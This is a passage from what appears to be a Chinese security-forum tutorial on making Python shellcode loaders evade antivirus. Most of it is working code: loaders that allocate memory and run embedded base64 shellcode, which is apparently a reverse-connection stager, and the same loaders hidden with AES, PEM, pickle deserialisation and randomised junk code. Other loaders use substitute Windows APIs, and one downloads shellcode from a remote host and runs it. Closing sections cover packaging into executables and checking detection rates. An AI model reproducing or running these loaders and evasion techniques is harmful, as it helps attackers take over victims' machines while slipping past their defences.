ZDalvXpwBNnVvq = utHlfsE.windll.kernel32.VirtualAlloc(utHlfsE.c_int(0),utHlfsE.c_int(len(znDuyLotmJPitl)),utHlfsE.c_int(0x3000),utHlfsE.c_int(0x04))
utHlfsE.windll.kernel32.RtlMoveMemory(utHlfsE.c_int(ZDalvXpwBNnVvq),znDuyLotmJPitl,utHlfsE.c_int(len(znDuyLotmJPitl)))
pmVvUiefseHqNNY = utHlfsE.windll.kernel32.VirtualProtect(utHlfsE.c_int(ZDalvXpwBNnVvq),utHlfsE.c_int(len(znDuyLotmJPitl)),utHlfsE.c_int(0x20),utHlfsE.byref(utHlfsE.c_uint32(0)))
JZcSPsSDPnvgtn = utHlfsE.windll.kernel32.CreateThread(utHlfsE.c_int(0),utHlfsE.c_int(0),utHlfsE.c_int(ZDalvXpwBNnVvq),utHlfsE.c_int(0),utHlfsE.c_int(0),utHlfsE.pointer(utHlfsE.c_int(0)))
utHlfsE.windll.kernel32.WaitForSingleObject(utHlfsE.c_int(JZcSPsSDPnvgtn),utHlfsE.c_int(-1))
```

这里直接是换了些随机的变量名，然后shellcode进行base64编码。

然而，前面的代码虽然增加了反沙箱的操作，但是无疑给杀软提供了更多可能被识别出来的特征，我们还需要对这些特征进行规避，所以它并不一定会更安全。

再来看一个 aes加密的：

`29)    python/shellcode_inject/aes_encrypt.py`

**ase\_test.py**

```python
import ctypes as iiNDktFoHGVBRd
from Crypto.Cipher import AES
import base64
yVVpTTnNP = AES.new('Bk1hMf9k$.f?XbO4u^#Qg#yS$/m9tyG/', AES.MODE_CBC, 'zOYsRtGtNOlkuHLd')
ZDRmJB = base64.b64decode('P6mAFv7b2EUDyANT5IMpOFXjdi4CBpqI0haGvxx/MwntkX69V8dq7gF9nac+uYYzEnQ+z0rRP7YJFn7I3k0ZJX5fxbuVHd6lhHoIcgrDmn8w8fTG4Pfjct5j2Zaoe+XWMUKnPmJdMRtbUy55YNcLPcX3haC0w8W7tQgecOe/Uz4nzylQGHOcEWBrZmmX1GpohYFR3hPIGq9wW8Y2lTkLlTI/pWngUOHWMFC16B5BGDWGSqSSBNrp3VlEo6fXtV5BRlDgAUvi2kht0Vp4ElBizVAWoDl8e4xWzoUcNUOlbwNVEnxSdAujbt1tzb7pyYaOxUlFaheGbuwD9E5Uk5PVWDvns/NVrDxmhJuzQYqHnrn3eF9i8pLFJs1ZwgL/WNgpTGvNrWmu5PZ5LIbbQXgaCDhaehjhqMNpRqyzhg/kEfAxKSc4w1gwrwga5knFUlJPmSmRJysZwp7YO57lIcOt3MklQcLjdEqjlHEidbWdWLkfsffMfD86hxjkgJaKtTwQLf6DOMeCyOGMfZAe1nTTyctYmIv3rd8pprmnpyxrdBkSKi1ZbP8U3ytBNGrQdG1AhClT/uhFVOO/mbvkzz3xY61/GvRtdz+58HhQdhwmxJ1Ma4Mk80aPHzmCOBX6kbEud350oUGWv11p6A+Rae40MmH+juk0D6JMXA0B9Kb4YGetkMMWn87ryRxh/yp71q8v6DGAIZfiBYImnH6abtkIJmw+58+7kzWsrSsv2X9TSeF6MlXOhpRxDpAmgf64dqxpM/QjSRdzQFHy5QV524hGP8MOiuYwVGZikslIAygRzBKLL6ZhZ02u7lcmDpXVsXBJEnaKf/GItnVgh5WIgBPJZ4R6Qv2lr62Iw4HGIhluiPcVcsRehKcW9pp2rxEQ6X4WKe+qDQrgxKUBGJmM8sg3xifochNv1Pq64V7ADxYt4BV/pQvoYRvcaM8AImtNJUIcREH5ZxdMegM19dtbsQ7db2O1twrVbsGvPjafr+qTuxIctBXVY/kTwiaeHTpzXYXjPb72ej1EYDtWyhycEPOKBtH0E86oJIkkcOD0GpAwMg4U6BSYCQIMXZ6sWa0DfeQKlDOOKy+/PZiNnwXnzvYG205RcX2SCF4XR54wjsWOdmcTArGVYiVsJhRoKLd370zjiebUfLE7UDrJ8ejmljdznaAsga4nLnyUSrZ3joGkfDU=')
ORopsFE = yVVpTTnNP.decrypt(ZDRmJB)
GkXYbXjZw = iiNDktFoHGVBRd.windll.kernel32.VirtualAlloc(iiNDktFoHGVBRd.c_int(0),iiNDktFoHGVBRd.c_int(len(ORopsFE)),iiNDktFoHGVBRd.c_int(0x3000),iiNDktFoHGVBRd.c_int(0x04))
iiNDktFoHGVBRd.windll.kernel32.RtlMoveMemory(iiNDktFoHGVBRd.c_int(GkXYbXjZw),ORopsFE,iiNDktFoHGVBRd.c_int(len(ORopsFE)))
MccFSqvaZINBB = iiNDktFoHGVBRd.windll.kernel32.VirtualProtect(iiNDktFoHGVBRd.c_int(GkXYbXjZw),iiNDktFoHGVBRd.c_int(len(ORopsFE)),iiNDktFoHGVBRd.c_int(0x20),iiNDktFoHGVBRd.byref(iiNDktFoHGVBRd.c_uint32(0)))
suNTtNpnntOupUa = iiNDktFoHGVBRd.windll.kernel32.CreateThread(iiNDktFoHGVBRd.c_int(0),iiNDktFoHGVBRd.c_int(0),iiNDktFoHGVBRd.c_int(GkXYbXjZw),iiNDktFoHGVBRd.c_int(0),iiNDktFoHGVBRd.c_int(0),iiNDktFoHGVBRd.pointer(iiNDktFoHGVBRd.c_int(0)))
iiNDktFoHGVBRd.windll.kernel32.WaitForSingleObject(iiNDktFoHGVBRd.c_int(suNTtNpnntOupUa),iiNDktFoHGVBRd.c_int(-1))

```

它做的也是 shellcode ase加密，给ctypes换了个别名,随机变量名。

当然，作为开源软件，veil的特征已经被杀软标记了，它的免杀效果已经不怎么样了，不适合拿来直接用。

我们只是用来对shellcode进行混淆，以及获取一些反沙箱的代码。

加载器代码混淆
-------

前面说的只是对shellcode进行混淆，但是杀软可不只是检测shellcode，所以我们还要对加载代码进行混淆。

> shellcode部分可以使用其他编码，与加载器分开处理。以下shellcode均使用base64编码作为测试。

### 随机变量名

veil生成的代码里用到了这种方法

比如：

`ctypes->utHlfsE` 、`shellcode->znDuyLotmJPitl`、`ptr->ZDalvXpwBNnVvq`......

```python
import ctypes as utHlfsE
import base64
znDuyLotmJPitl = base64.b64decode("/EiD5PDoyAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwJ1couAiAAAAEiFwHRnSAHQUItIGESLQCBJAdDjVkj/yUGLNIhIAdZNMclIMcCsQcHJDUEBwTjgdfFMA0wkCEU50XXYWESLQCRJAdBmQYsMSESLQBxJAdBBiwSISAHQQVhBWF5ZWkFYQVlBWkiD7CBBUv/gWEFZWkiLEulP////XWoASb53aW5pbmV0AEFWSYnmTInxQbpMdyYH/9VIMclIMdJNMcBNMclBUEFQQbo6Vnmn/9Xrc1pIicFBuFAAAABNMclBUUFRagNBUUG6V4mfxv/V61lbSInBSDHSSYnYTTHJUmgAAkCEUlJBuutVLjv/1UiJxkiDw1BqCl9IifFIidpJx8D/////TTHJUlJBui0GGHv/1YXAD4WdAQAASP/PD4SMAQAA69Pp5AEAAOii////LzRteEQAp9Aj4CqXYbbIwHANt0VcayUT6GfUbiCX+qjtquwmOrievppIiuOWfNniEdCWAF7js5vbahKPjrUjon47f5JP79wIKCw84ql6JABVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMDsgTUFBVTsgTlAwOCkNCgAYZADngQNwh2cj52nugbTcxg6nAqiGJ9aKZHF0UzytK8rYtQ/Ue44z2BrXSJXR+jQZ0NuVJ5wsbYDW4+BnA5XpAixgwvPUl2NgN9uvL13TtnDrtzlYcRTypNyby6fLmF47VktLOpJQ8spLj2799CdoePvnZLMU7ZSCupFZEmJ7t95KUW0Hv7GkJatMMXMb8JiDNj+Q4b/VQAqSThp/eNg1NiTtEE7u+UwREUSGfhqF8Yjkzj7Jsgtpg3LCmej9Lm8LN9l+L7zRBF8AQb7wtaJW/9VIMcm6AABAAEG4ABAAAEG5QAAAAEG6WKRT5f/VSJNTU0iJ50iJ8UiJ2kG4ACAAAEmJ+UG6EpaJ4v/VSIPEIIXAdLZmiwdIAcOFwHXXWFhYSAUAAAAAUMPon/3//zE5Mi4xNjguMTExLjEzMQASNFZ4")
ZDalvXpwBNnVvq = utHlfsE.windll.kernel32.VirtualAlloc(utHlfsE.c_int(0),utHlfsE.c_int(len(znDuyLotmJPitl)),utHlfsE.c_int(0x3000),utHlfsE.c_int(0x04))
utHlfsE.windll.kernel32.RtlMoveMemory(utHlfsE.c_int(ZDalvXpwBNnVvq),znDuyLotmJPitl,utHlfsE.c_int(len(znDuyLotmJPitl)))
pmVvUiefseHqNNY = utHlfsE.windll.kernel32.VirtualProtect(utHlfsE.c_int(ZDalvXpwBNnVvq),utHlfsE.c_int(len(znDuyLotmJPitl)),utHlfsE.c_int(0x20),utHlfsE.byref(utHlfsE.c_uint32(0)))
JZcSPsSDPnvgtn = utHlfsE.windll.kernel32.CreateThread(utHlfsE.c_int(0),utHlfsE.c_int(0),utHlfsE.c_int(ZDalvXpwBNnVvq),utHlfsE.c_int(0),utHlfsE.c_int(0),utHlfsE.pointer(utHlfsE.c_int(0)))
utHlfsE.windll.kernel32.WaitForSingleObject(utHlfsE.c_int(JZcSPsSDPnvgtn),utHlfsE.c_int(-1))
```

#### 随机变量生成器

简单生成了些随机变量：

将一些变量名称替换成了随机数，并在代码中间插入随机无效代码。

**random\_variable.py**

```python
import random
import string

class AutoRandom:
    def auto_random_int(self,max_int=999,min_int=0):
        return random.randint(min_int,max_int)

    def auto_random_str(self,min_length=8,max_length=15):
        length=random.randint(min_length,max_length)
        return ''.join(random.choice(string.ascii_letters) for x in range(length))

    def auto_random_void_command(self,min_str=500,max_str=1000,min_int=1,max_ini=9):
        void_command = [
            #'print("var1")'.replace('var1',str(self.auto_random_int(999999))),
            'var1 = var2 + var3'.replace('var1',self.auto_random_str(min_str,max_str)).replace('var2',str(self.auto_random_int(99999))).replace('var3',str(self.auto_random_int(99999))),
            'var1 = var2 - var3'.replace('var1',self.auto_random_str(min_str,max_str)).replace('var2',str(self.auto_random_int(99999))).replace('var3',str(self.auto_random_int(99999))),
            'var1 = var2 * var3'.replace('var1',self.auto_random_str(min_str,max_str)).replace('var2',str(self.auto_random_int(99999))).replace('var3',str(self.auto_random_int(99999))),
            'var1 = var2 / var3'.replace('var1',self.auto_random_str(min_str,max_str)).replace('var2',str(self.auto_random_int(99999))).replace('var3',str(self.auto_random_int(99999))),
            'var1 = "var2" + "var3"'.replace('var1',self.auto_random_str(min_str,max_str)).replace('var2',self.auto_random_str(min_str,max_str)).replace('var3',self.auto_random_str(min_str,max_str)),
            'print("var1")'.replace('var1',self.auto_random_str(min_str,max_str))
            ]
        return void_command[self.auto_random_int(len(void_command)-1)]

def make_variable_random(shellcodeloader):
    shellcodeloader = shellcodeloader.replace("ctypes", AutoRandom.auto_random_str(min_length=8, max_length=15))
    shellcodeloader = shellcodeloader.replace("shellcode",AutoRandom.auto_random_str(min_length=8,max_length=15))
    shellcodeloader = shellcodeloader.replace("ptr", AutoRandom.auto_random_str(min_length=8, max_length=15))
    shellcodeloader = shellcodeloader.replace("buffered", AutoRandom.auto_random_str(min_length=8, max_length=15))
    shellcodeloader = shellcodeloader.replace("handle", AutoRandom.auto_random_str(min_length=8, max_length=15))
    return shellcodeloader

def make_command_random(shellcodeloader):
    shellcodeloader = shellcodeloader.replace("command1", AutoRandom.auto_random_void_command())
    shellcodeloader = shellcodeloader.replace("command2", AutoRandom.auto_random_void_command())
    shellcodeloader = shellcodeloader.replace("command3", AutoRandom.auto_random_void_command())
    shellcodeloader = shellcodeloader.replace("command4", AutoRandom.auto_random_void_command())
    shellcodeloader = shellcodeloader.replace("command5", AutoRandom.auto_random_void_command())
    shellcodeloader = shellcodeloader.replace("command6", AutoRandom.auto_random_void_command())
    shellcodeloader = shellcodeloader.replace("command7", AutoRandom.auto_random_void_command())
    return shellcodeloader

if __name__ == '__main__':
    AutoRandom = AutoRandom()
    shellcodeloader = '''
        正常shellcode加载器代码
'''

    shellcodeloader = make_variable_random(shellcodeloader)
    shellcodeloader = make_command_random(shellcodeloader)

    print(shellcodeloader)
```

**使用方法：**

将正常shellcode加载器代码去到`import`部分在一些部位添加标志位，放到 shellcodeloader：

![image-20220523183016956.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-4656fc709d7986c34ec59765a6f48ebc22a0567d.png)

然后运行：

![image-20220523183101065.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-19a71bce7a6d09c01615ac66bc43781a091db233.png)

将生成的代码复制出来，根据生成的随机数，给ctypes库起个别名：

![image-20220523183507638.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-29cacb307b22893fd9e7ed2d7300940fc6044ac0.png)

然后运行，即可上线。

### base64

shellcode部分可以使用其他编码，与加载器分开处理。以下shellcode均使用base64编码作为测试。

**shellcodeloader\_base64\_encode.py：**

```python
import base64

# 加密

#base64_loader = base64.b64encode(b""" xxxx""")

base64_loader = base64.b64encode(b"""
shellcode = bytearray(buf)
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    buf,
    ctypes.c_int(len(shellcode))
)
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.c_uint64(ptr),
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0))
)
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
""")

print(base64_loader)
```

![image-20220523220937691.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b5eb0e86dca6e62bc32681c9d1f76f2a11f9a928.png)

**base64\_decode\_shellcodeloader.py**

```python
import base64
import ctypes

buf = base64.b64decode(b'/EiD5PDoyAAAAEF......')

base64_loader = base64.b64decode(b'CnNoZWxsY29kZSA9IGJ5dGVhcnJheShidWYpCmN0eXBlcy53aW5kbGwua2VybmVsMzIuVmlydHVhbEFsbG9jLnJlc3R5cGUgPSBjdHlwZXMuY191aW50NjQKcHRyID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MoY3R5cGVzLmNfaW50KDApLCBjdHlwZXMuY19pbnQobGVuKHNoZWxsY29kZSkpLCBjdHlwZXMuY19pbnQoMHgzMDAwKSwgY3R5cGVzLmNfaW50KDB4NDApKQpidWYgPSAoY3R5cGVzLmNfY2hhciAqIGxlbihzaGVsbGNvZGUpKS5mcm9tX2J1ZmZlcihzaGVsbGNvZGUpCmN0eXBlcy53aW5kbGwua2VybmVsMzIuUnRsTW92ZU1lbW9yeSgKICAgIGN0eXBlcy5jX3VpbnQ2NChwdHIpLAogICAgYnVmLAogICAgY3R5cGVzLmNfaW50KGxlbihzaGVsbGNvZGUpKQopCmhhbmRsZSA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuQ3JlYXRlVGhyZWFkKAogICAgY3R5cGVzLmNfaW50KDApLAogICAgY3R5cGVzLmNfaW50KDApLAogICAgY3R5cGVzLmNfdWludDY0KHB0ciksCiAgICBjdHlwZXMuY19pbnQoMCksCiAgICBjdHlwZXMuY19pbnQoMCksCiAgICBjdHlwZXMucG9pbnRlcihjdHlwZXMuY19pbnQoMCkpCikKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5XYWl0Rm9yU2luZ2xlT2JqZWN0KGN0eXBlcy5jX2ludChoYW5kbGUpLGN0eXBlcy5jX2ludCgtMSkpCg==').decode()
exec(base64_loader)
```

运行上面代码，即可上线：

![image-20220523221028602.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-70491616a86d940957ca4062e71b7288d7ffc156.png)

![image-20220523221041127.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-42651550d9d38ef8c0acfe2db2b947e1ac8c199e.png)

### PEM

**shellcodeloader\_pem\_encode.py**

```python
from Crypto.IO import PEM

#pem_loader = b""" xxx """

pem_loader = b"""
shellcode = bytearray(buf)
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    buf,
    ctypes.c_int(len(shellcode))
)
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.c_uint64(ptr),
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0))
)
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
"""
# 加密
# passphrase：指定密钥,可以为空 passphrase=None
# marker：指定名称
buf = PEM.encode(pem_loader, marker="shellcodeloader", passphrase=b'123', randfunc=None)
```

![image-20220523222528847.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-f80ecd03d193070ad67b1dcbabb660faab9896f2.png)

**pem\_decode\_shellcodeloader.py**

```python
from Crypto.IO import PEM
import base64
import ctypes

buf = base64.b64decode(b'/EiD5PDoyAAAAEFRQV....')

# 加密后的shellcodeloader
pem_loader = """-----BEGIN shellcodeloader-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,A854E7C9A4B45953

0SOWvJk0PkSI2jcnFkd3RXmqdGLOb7ruOPOv/EnvCMX2ercXRTLGfM3USCLZGPbC
bz/LfU812HCDa5OOYXmtZSiRGqvEd5fdZ44kreyK8L1YX0Arf6RbTJz+wnNzR9jT
QVQLUVKlR5BFI9vabgNWBLgdDdQqYNKop0HrsznAbx9FpvpPlowkqfBI1L35KYEt
CT8UCdJr891Q4Sjtnv+P6rpJF8Gu2UaMMAIIBlFwjG0e1y9M4UL6l5qixDGIICWS
8T619CqurhDpV+1pKcH8K8Ppp0nuaJo9gGKVnb/IafGBuTcjmZnCWSWmAhZpSnCR
NDwHbhFRd2N3qZ+gRQLNdHYgQiByQHesg1kRaKlkOziwhDGhcbWjX1Y91fAhSjKL
EyuFjzYJNJcYvvvyIlHu1x/fF9MYJRVUbZCD0fcbTNopWGygv5NfOc2SRU9oYJKh
XYOQo02pvXxaZhOWaNXRIQjS7xs6948GHSKXWRhddZiXLHxa1LGz3x5vh0DF7vC7
UxoZeocqSAsLLQeuIlzt/uqF+0c/rc1CC9WeqK4sl8pbsZSeURCv5E2Ztq/NYr1z
DWR1q/rYTmgIHAJwLKg4bfx/gWWqgQ8KMFXHnuSzTf/eYn7m3BeIKwXW+MisHskb
QaHnCItC2q4ISc6Xaz/f4CGWnutKnjRxJsJxbAznHqDEDyGDSTb1KLgcVx9bhLhj
xyJYaYII6G+jJjOsWYjmu4xsiAN/AW8HPJUdcYV+XtOrBzZfVlE46YiHbwky31oR
Q38gOcfsnz8oeIsGcBPNYpKUaGdgcyXqhVoKlGkWijN5G6j8oKsWw8ABuOn0Qn3Y
4A32/MBX4/2rA0lerBksv7GFUzMik0xe8odPKy77Aks/KYyVZZUuDCs+Of1Ti5e0
-----END shellcodeloader-----"""
# 解密
loader = bytearray(PEM.decode(pem_loader, passphrase=b'123')[0])

exec(loader)
```

运行上面代码，即可上线：

![image-20220523223029149.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-1a2503101afdad8946ca6a9923828e273364b87e.png)

![image-20220523223004124.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-622e5a8c060380a998d453547ddd6604e0c51117.png)

### 反序列化

> 关于phthon反序列化相关就不详细展开了，可以看一下下面这篇文章
> 
> [https://misakikata.github.io/2020/04/python-反序列化/](https://misakikata.github.io/2020/04/python-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/)

python 序列化和反序列化使用最为频繁的是`cPickle`和`pickle`，前者是C语言实现，据说速度比后者快很多。

只不过python3标准库中不再叫`cPickle`，而是只有`pickle`。python2中两者都有。

`pickle`有如下四种操作方法:

![image-20220528181143183.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-9ba7893d3ab7464eaaa89dd0ce86370c88d5ef89.png)

与`PHP`中的`__wakeup`类似，`Python`中的`__reduce__`方法在对象被反序列化的时候执行。

**shellcodeloader\_serialize.py**

```python
import pickle
import base64

shellcodeloader = """
import ctypes,base64,time

#这里不能直接存在空字节，反序列化的时候会出错，所以要处理一下
shellcode = base64.b64decode(b'/EiD5PDoyAAAAE....')
shellcode = codecs.escape_decode(shellcode)[0]
shellcode = bytearray(shellcode)

ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64

ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),  
    ctypes.c_int(len(shellcode)),
    ctypes.c_int(0x3000),  
    ctypes.c_int(0x40) 
    )

buffered = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    buffered,
    ctypes.c_int(len(shellcode))
)

handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0),
    ctypes.c_int(0), 
    ctypes.c_uint64(ptr), 
    ctypes.c_int(0), 
    ctypes.c_int(0), 
    ctypes.pointer(ctypes.c_int(0)) 
)

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
"""

class AAA(object):
    def __reduce__(self):
        return (exec, (shellcodeloader,))

seri = pickle.dumps(AAA())
seri_base64 = base64.b64encode(seri)
print(seri_base64)
```

![image-20220528221350690.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-1953ddb627bbb98a0aaf3cc604d49e2217436deb.png)

**unserialize\_shellcodeloader.py**

```python
import base64,pickle

shellcodeloader = b'gASVwgcAAAAAAACMCGJ1aWx0aW5zlIwEZX............'
pickle.loads(base64.b64decode(shellcodeloader))
```

运行上面代码，即可上线：

![image-20220528232529722.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a8607a13cb57d6b33c523025a48a9147c823f02d.png)

0x03 寻找新的api
============

> **win api涉及很多内容，篇幅问题，这里不详细展开了，仅举个例子。**

shellcode加载分为3步：申请内存-&gt;shellcode写入内存(-&gt; 修改内存属性)-&gt;执行该内存

但是我们常用的函数，已经被一些杀软标记查杀

```php
ctypes.windll.kernel32.VirtualAlloc
ctypes.windll.kernel32.RtlMoveMemory
ctypes.windll.kernel32.CreateThread
```

我们需要找到其他一些有类似功能的函数，来替代他们。具有哪些函数可以起到类似的作用，大家可以去微软api文档里找找看。

**例如：**

AllocADsMem：

```php
https://docs.microsoft.com/en-us/windows/win32/api/adshlp/nf-adshlp-allocadsmem
```

ReallocADsMem

```php
https://docs.microsoft.com/en-us/windows/win32/api/adshlp/nf-adshlp-reallocadsmem
```

**测试：**

```python
import ctypes

shellcode = b"\xfc\x48\x83\"

macmem = ctypes.windll.Activeds.AllocADsMem(len(shellcode)/6*17)
for i in range(len(shellcode)/6):
     bytes_a = shellcode[i*6:6+i*6]
     ctypes.windll.Ntdll.RtlEthernetAddressToStringA(bytes_a, macmem+i*17)

list = []
for i in range(len(shellcode)/6):
    d = ctypes.string_at(macmem+i*17,17)
    list.append(d)

ptr = ctypes.windll.Activeds.AllocADsMem(len(list)*6)
rwxpage = ptr
for i in range(len(list)):
    ctypes.windll.Ntdll.RtlEthernetStringToAddressA(list[i], list[i], rwxpage)
    rwxpage += 6

ctypes.windll.kernel32.VirtualProtect(ptr, len(list)*6, 0x40, ctypes.byref(ctypes.c_long(1)))
handle = ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
```

0x04 shellcode分离
================

最简单实用的分离就是将编码后的shellcode放到服务器上，再由加载器访问服务器页面地址，获取页面的`Shellcode`内容，之后加载并执行

这里shellcode使用base64编码测试：

```python
import ctypes
import requests
import base64
import urllib.request

rep = requests.get("http://192.168.111.132/1.txt")
shellcode = bytearray(base64.b64decode(rep.content))

ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64

ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),
    ctypes.c_int(len(shellcode)),
    ctypes.c_int(0x3000),
    ctypes.c_int(0x40)
)

buffered = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    buffered,
    ctypes.c_int(len(shellcode))
)

handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.c_uint64(ptr),
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0))
)

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))
```

![image-20220529201702596.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-750b70f02b83b7680511897476f1a924a373b36d.png)

![image-20220529201621345.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-4bb7c5d9498d9063b82f368c602078faae6f7e17.png)

0x05 python打包成exe
=================

上面我们构建了我们的`Python`文件，但是需要目标环境支持`Python`以及存在相应的库才可以利用，因此我们可以将我们的`Python`脚本打包成可执行程序来解决这些环境问题，打包方法有很多，例如`pyinstaller`或者`py2exe`、`cx_Freeze`

我们使用不同的打包程序，最后免杀的效果也不太一样，部分杀软对打包程序本身就加入了特征检测...

pyinstaller
-----------

**安装：**

python3:

```php
pip3 install pyinstaller -i https://pypi.douban.com/simple
```

python2:

```php
pip2 install pyinstaller==3.6 -i https://pypi.douban.com/simple
```

为了python2、python3都可以使用pyinstaller，进行各个的scripts目录，将pyinstaller.exe的名字分别改为pyinstaller2.exe、pyinstaller3.exe

![image-20220428193243196.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a58dfae7ff8fb726695b905698db2f42549509f6.png)

![image-20220428193314906.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-51b23cea8b155906b79c6fca6aa9357cafbbfd23.png)

**基本语法：**

```php
pyinstaller -F test.py -w -i test.ico  #使用-w参数会增加被杀软检测到的可能性
```

```php
-F，-onefile: 表示生成单个可执行文件，常用。
-w, -windowed, -noconsole:表示运行时不会出现黑窗控制台。
-p 表示你自己自定义需要加载的类路径，一般情况下用不到
-i 表示可执行文件的图标。注意:图片后缀必须是.ico
-c,console,-nowindowed:此为windows系统的默认选项，使用这个参数，运行时会有一个黑窗控制台。
-D，-onedir：创建一个目录，包含EXE文件，但会依赖很多文件（默认选项）
```

**测试：**

我们打包一个空项目，VT检测一下

![image-20220428194058970.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-ecba6c49eefbe8b1df10710fe346c4a8da4f18a5.png)

```php
pyinstaller2 -F hello.py   #pyinstaller 3.6
```

![image-20220428194442547.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-dc28ccfb1dce387586dbcfb547357ee42abe54ce.png)

```php
pyinstaller3 -F hello.py -w   #pyinstaller 5.0.1
```

![image-20220428200203345.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-ce3fef2e581fa98eb23f7cb50b46b96005f6f34a.png)

```php
pyinstaller3 -F hello.py   #pyinstaller 3.6
```

![image-20220428200628770.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-1639dfc6e2627aa49048639e13b792b780ece262.png)

可以看到使用python3+最新版本pyinstaller编译出来的exe，即使什么功能都没有，也会被很多杀软识别，所以我们还是尽量选用 **python2+低版本的pyinstaller**。

同时，python3编译出来的exe，要比python2的exe文件大很多。\[虽然都挺大的...\]

```php
pyinstaller2 -F hello.py -w  #pyinstaller 3.6
```

![image-20220428201533309.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-aa30d42449d8f0066dd4b0b26dbbc91cf7f0b3d2.png)

py2exe
------

**安装：**

python3

```php
pip3 install py2exe
```

python2

```php
pip2 install https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/py2exe-0.6.9.zip/download
```

```php
Microsoft Visual C++ 9.0 下载：
https://github.com/reider-roque/sulley-win-installer/blob/master/VCForPython27.msi
```

**使用：**

```php
参考：https://hoxis.github.io/python-py2exe.html
```

创建个文件**setup.py**

> python3适用，python2在win64上无法打包到单个exe文件，还没解决

```python
#coding=utf-8
from distutils.core import setup
import py2exe
setup(
    options={
        'py2exe': {
            'optimize': 2,  
            'bundle_files': 1,  # 所有文件打包成一个 exe 文件 
            'compressed': True,
        },
    },
    #console=[{"script": "test.py", "icon_resources": [(1, "test.ico")]}],  #显示控制台
    windows=[{"script": "test.py", "icon_resources": [(1, "test.ico")]}],   #不显示控制台
    zipfile=None,
)
```

修改test.py为要打包的文件，test.ico为图标。

然后运行

```php
python2 setup.py py2exe
python3 setup.py py2exe
```

**测试：**

我们打包一个空项目，VT检测一下

```php
python3 setup.py py2exe    #不显示控制台 windows
```

![image-20220428211850165.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-e38e8d40f53811fd37bed1a348de4a87176eeccc.png)

```php
python3 setup.py py2exe    #显示控制台  console
```

![image-20220428212210339.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-29c4a67028cbc1521306b9639b23d6ef812a1108.png)

**python2**

把所有东西打包到一个exe 不支持

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-665edecfb9a5548fcd720fc0799475632cddaa66.png)  
临时方法：

**setup.py**

```#coding=utf-8
from distutils.core import setup  
